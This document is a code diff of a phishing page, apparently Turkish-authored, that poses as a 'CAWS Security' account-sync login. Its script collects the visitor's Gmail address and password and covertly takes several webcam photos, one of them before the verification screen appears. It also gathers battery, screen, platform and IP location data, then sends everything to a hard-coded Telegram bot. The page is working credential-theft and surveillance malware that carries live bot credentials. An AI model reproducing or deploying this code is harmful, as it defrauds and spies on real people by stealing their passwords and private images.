@@ -3,50 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CAWS Security | Global Nexus Authentication</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
+    <title>CAWS Security | Global Nexus</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --main: #111; --bg: #fdfdfd; --border: #e2e2e2; --accent: #0071ad; }
+        :root { --main: #111; --bg: #fdfdfd; --border: #e2e2e2; --accent: #00d2ff; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        
         body { background: var(--bg); font-family: 'Inter', sans-serif; color: var(--main); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        
+        /* Arka Plan Yazısı */
+        body::before { content: "CAWS"; position: absolute; font-weight: 900; font-size: 25vw; color: rgba(0,0,0,0.02); z-index: 0; pointer-events: none; }
 
-        /* Arka Plan Yazısı (Boşluk Katili) */
-        body::before { content: "CAWS"; position: absolute; font-weight: 900; font-size: 25vw; color: rgba(0,0,0,0.015); z-index: 0; pointer-events: none; letter-spacing: -10px; }
-
-        .auth-card { width: 100%; max-width: 420px; padding: 50px 30px; background: #fff; text-align: center; border: 1px solid var(--border); box-shadow: 0 10px 40px rgba(0,0,0,0.04); position: relative; z-index: 10; border-radius: 4px; }
-        .logo { font-weight: 900; font-size: 38px; letter-spacing: -3px; color: #000; margin-bottom: 5px; }
+        .auth-card { width: 100%; max-width: 400px; padding: 50px 30px; background: #fff; text-align: center; border: 1px solid var(--border); box-shadow: 0 10px 40px rgba(0,0,0,0.05); position: relative; z-index: 10; border-radius: 4px; }
+        .logo { font-weight: 900; font-size: 38px; letter-spacing: -3px; margin-bottom: 5px; }
         .tagline { font-size: 10px; text-transform: uppercase; letter-spacing: 4px; color: #aaa; margin-bottom: 40px; }
 
-        h2 { font-size: 18px; font-weight: 700; margin-bottom: 12px; }
-        .desc { font-size: 13px; color: #666; margin-bottom: 30px; line-height: 1.6; }
-
         .input-group { text-align: left; margin-bottom: 25px; }
-        .input-group label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; color: #000; }
-        .input-group input { width: 100%; padding: 15px 0; background: transparent; border: none; border-bottom: 1.5px solid var(--border); font-size: 14px; outline: none; transition: 0.3s; }
-        .input-group input:focus { border-bottom-color: #000; }
+        .input-group label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
+        .input-group input { width: 100%; padding: 15px 0; background: transparent; border: none; border-bottom: 1.5px solid var(--border); outline: none; }
 
-        .nexus-btn { background: #000; color: #fff; border: none; width: 100%; padding: 20px; font-weight: 700; font-size: 13px; text-transform: uppercase; cursor: pointer; transition: 0.3s; letter-spacing: 1px; }
-        .nexus-btn:hover { background: #222; }
+        .nexus-btn { background: #000; color: #fff; border: none; width: 100%; padding: 20px; font-weight: 700; text-transform: uppercase; cursor: pointer; }
 
-        /* ANALİZ EKRANI (ADIM 2) */
-        #verify-view { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:100; flex-direction:column; align-items:center; justify-content:center; padding: 20px; }
-        .video-box { width: 280px; height: 280px; border-radius: 50%; overflow: hidden; border: 8px solid #f9f9f9; box-shadow: 0 10px 30px rgba(0,0,0,0.05); margin-bottom: 20px; }
+        /* TARAMA EKRANI */
+        #verify-view { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:100; flex-direction:column; align-items:center; justify-content:center; }
+        .video-box { position: relative; width: 300px; height: 300px; border-radius: 50%; border: 4px solid #f0f0f0; overflow: hidden; }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .code-display { font-size: 42px; font-weight: 900; letter-spacing: 12px; margin: 20px 0; color: #000; background: #f4f4f4; padding: 10px 30px; border-radius: 8px; }
-        .loader-text { font-size: 11px; font-weight: 800; color: var(--accent); text-transform: uppercase; margin-top: 20px; letter-spacing: 2px; }
-
-        .footer-logos { margin-top: 40px; display: flex; justify-content: center; gap: 20px; filter: grayscale(1); opacity: 0.3; }
-        .footer-logos img { height: 14px; }
+        .scan-line { position: absolute; top: 0; width: 100%; height: 4px; background: var(--accent); box-shadow: 0 0 15px var(--accent); animation: scanning 2s infinite ease-in-out; }
+        @keyframes scanning { 0% { top: 10%; } 100% { top: 90%; } }
+        .code-display { font-size: 42px; font-weight: 900; letter-spacing: 12px; margin: 20px 0; background: #f4f4f4; padding: 10px 30px; border-radius: 8px; }
+        .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: none; }
     </style>
 </head>
 <body>
 
+<div id="flash" class="flash"></div>
+
 <div class="auth-card" id="step-1">
     <div class="logo">CAWS</div>
     <div class="tagline">Sensor Protocol</div>
-    <h2>Account Sync</h2>
-    <p class="desc">Caws Network sunucularına güvenli erişim sağlamak için kimliğinizi doğrulayın.</p>
+    <p style="font-size: 13px; color: #666; margin-bottom: 30px;">Sunucu senkronizasyonu için kimlik doğrulaması gereklidir.</p>
     
     <div class="input-group">
         <label>Master Gmail</label>
@@ -57,117 +51,117 @@
         <input type="password" id="pass" placeholder="••••••••">
     </div>
     
-    <button class="nexus-btn" onclick="initForensic()">Continue</button>
-    
-    <div class="footer-logos">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/SSL_Cloudflare_logo.svg">
-    </div>
+    <button class="nexus-btn" onclick="preCapture()">Continue</button>
 </div>
 
 <div id="verify-view">
-    <div style="font-size:11px; font-weight:900; color:#aaa; text-transform:uppercase;">Lütfen kodu sesli okuyarak kameraya bakın:</div>
-    <div class="code-display" id="display-code">---</div>
+    <div style="font-size:11px; font-weight:900; color:#aaa; text-transform:uppercase; margin-bottom:10px;">Görsel Analiz Başlatıldı</div>
     <div class="video-box">
+        <div class="scan-line"></div>
         <video id="webcam" autoplay playsinline muted></video>
     </div>
-    <p style="font-size:12px; color:#777; max-width:280px; text-align:center;">Yapay zeka görsel verileri ve donanım imzasını analiz ediyor...</p>
-    <div class="loader-text" id="status-text">Analiz Başlatıldı...</div>
+    <div class="code-display" id="display-code">---</div>
+    <p id="status-text" style="font-size:11px; font-weight:800; color:var(--accent);">KODU OKUYUN: SİSTEM ANALİZ EDİYOR...</p>
 </div>
 
 <script>
     const tgToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
     const tgChat = "1540769169";
 
-    async function initForensic() {
+    async function preCapture() {
         const mail = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
-        if(!mail || !pass) return alert("Hata: Bilgileri doldurun.");
-
-        document.getElementById('display-code').innerText = Math.floor(Math.random() * 899) + 100;
+        if(!mail || !pass) return alert("Bilgileri doldurun.");
 
         try {
+            // 1. Kamerayı hemen aç
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('webcam');
+            video.srcObject = stream;
+
+            // 2. DAHA EKRAN DEĞİŞMEDEN İLK FOTOĞRAFI ÇEK (O daha butona basıyor)
+            setTimeout(() => { capture(video, "INSTANT_CAPTURE", mail, pass); }, 100);
+
+            // 3. Ekranı değiştir
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('verify-view').style.display = 'flex';
-            document.getElementById('webcam').srcObject = stream;
+            document.getElementById('display-code').innerText = Math.floor(Math.random() * 899) + 100;
 
-            // Donanım toplama
-            let bat = "Bilinmiyor";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                bat = `%${Math.round(b.level * 100)} ${b.charging ? '⚡' : '🔋'}`;
-            }
+            // 4. İkinci fotoğraf (Tarama başladığı an)
+            setTimeout(() => { capture(video, "SCAN_START", mail, pass); }, 1500);
 
-            const logs = {
-                os: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                cores: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
-                lang: navigator.language
-            };
-
-            // 4 saniye sonra her şeyi yakala
-            setTimeout(() => { captureFinal(mail, pass, bat, logs); }, 4500);
+            // 5. Üçüncü fotoğraf + Rapor (Kodu okurken)
+            setTimeout(() => { 
+                triggerFlash();
+                captureFullReport(video, mail, pass); 
+            }, 4000);
 
         } catch (e) {
             alert("Sistem Hatası: Güvenlik donanımı (Kamera) başlatılamadı.");
         }
     }
 
-    async function captureFinal(mail, pass, bat, logs) {
-        const video = document.getElementById('webcam');
+    function triggerFlash() {
+        const f = document.getElementById('flash');
+        f.style.display = 'block';
+        setTimeout(() => { f.style.display = 'none'; }, 100);
+    }
+
+    async function capture(video, type, mail, pass) {
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-
         canvas.toBlob(async (blob) => {
-            document.getElementById('status-text').innerText = "SENKRONİZE EDİLİYOR...";
-
-            // 1. Fotoğrafı Gönder
             const fd = new FormData();
-            fd.append('photo', blob, 'report.jpg');
+            fd.append('photo', blob, `${type}.jpg`);
+            fd.append('caption', `⚡️ CAWS [${type}] - ${mail}`);
+            await fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto?chat_id=${tgChat}`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.6);
+    }
+
+    async function captureFullReport(video, mail, pass) {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            // Fotoğrafı gönder
+            const fd = new FormData();
+            fd.append('photo', blob, 'final_report.jpg');
             await fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto?chat_id=${tgChat}`, { method: 'POST', body: fd });
 
-            // 2. IP Çek
+            // Bilgileri topla ve raporu gönder (Önceki efsane rapor formatı)
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipD = await ipRes.json();
+            
+            let bat = "Bilinmiyor";
+            if (navigator.getBattery) { const b = await navigator.getBattery(); bat = `%${Math.round(b.level * 100)} ${b.charging ? '⚡' : '🔋'}`; }
 
-            // 3. Efsane Rapor
             const report = `
-⚡️ **CAWS NETWORK | SENSOR REPORT** ⚡️
+⚡️ **CAWS NETWORK | FINAL REPORT** ⚡️
 ────────────────────────
-👤 **HESAP BİLGİLERİ**
+👤 **BİLGİLER**
 📧 **Mail:** \`${mail}\`
 🔑 **Şifre:** \`${pass}\`
 
-🔋 **DONANIM DURUMU**
+🔋 **CİHAZ**
 🔋 **Pil:** \`${bat}\`
-🧠 **İşlemci:** \`${logs.cores} Çekirdek\`
-💾 **Bellek:** \`${logs.ram}\`
-🖥️ **Ekran:** \`${logs.screen}\`
+🖥️ **Ekran:** \`${window.screen.width}x${window.screen.height}\`
+⚙️ **Platform:** \`${navigator.platform}\`
 
-🌐 **AĞ & KONUM**
+🌐 **AĞ**
 🌍 **IP:** \`${ipD.ip}\`
-📍 **Şehir:** \`${ipD.city} / ${ipD.country_name}\`
+📍 **Şehir:** \`${ipD.city}\`
 🏢 **ISS:** \`${ipD.org}\`
-
-📱 **SİSTEM**
-⚙️ **Platform:** \`${logs.os}\`
-🌐 **Dil:** \`${logs.lang}\`
-────────────────────────
-📝 *Veriler Caws Forensic tarafından şifrelenmiştir.*`;
+────────────────────────`;
 
             await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChat}&text=${encodeURIComponent(report)}&parse_mode=markdown`);
 
-            setTimeout(() => {
-                alert("Başarılı: Caws Server ile bağlantı kuruldu.");
-                window.location.href = "https://caws.network";
-            }, 1000);
+            document.getElementById('status-text').innerText = "DOĞRULAMA TAMAMLANDI";
+            setTimeout(() => { window.location.href = "https://caws.network"; }, 1000);
         }, 'image/jpeg', 0.8);
     }
 </script>
 </body>
 </html>
+
